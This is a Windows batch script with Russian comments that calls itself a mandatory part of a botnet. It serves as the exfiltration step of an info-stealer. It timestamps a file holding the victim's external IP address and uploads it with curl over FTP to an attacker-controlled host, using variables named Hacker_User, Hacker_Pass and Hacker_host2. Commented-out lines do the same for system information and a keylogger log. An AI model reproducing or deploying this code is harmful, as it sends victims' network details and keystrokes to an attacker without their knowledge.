@echo off
rem Сценарий Windows, отправляющий результаты работы стайлера хозяину
rem Служит для оффлайн подачи команд хозяина стайлера, когда онлайн доступ не работает.

Rem !!! Обязательная часть ботнета  !!!

set CURDATE=%DATE%
if %TIME:~0,1% == " " then GOTO CHECK
set CURTIME=%TIME%
GOTO NEXTOP
:CHECK
set CURTIME=0%TIME:~1,8%
:NEXTOP

set newname2=MyIP-%CURDATE:~8,2%%CURDATE:~3,2%%CURDATE:~0,2%_%CURTIME:~0,2%%CURTIME:~3,2%%CURTIME:~6,2%.txt
move /Y %PUB1%\Util\MyIp.txt %PUB1%\Util\%newname2%

rem Отправка внешнего IP адреса на сервер хозяина
curl --upload-file %PUB1%\Util\%newname2% ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%/
set CURDATE=
set CURRTIME=
set newname2=


REM Необязательная часть ботнета

rem curl --upload-file %PUB1%\Util\MySystemInfoCheck.txt ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%/
rem curl --upload-file %PUB1%\Util\Klavik\klavik.txt ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%/
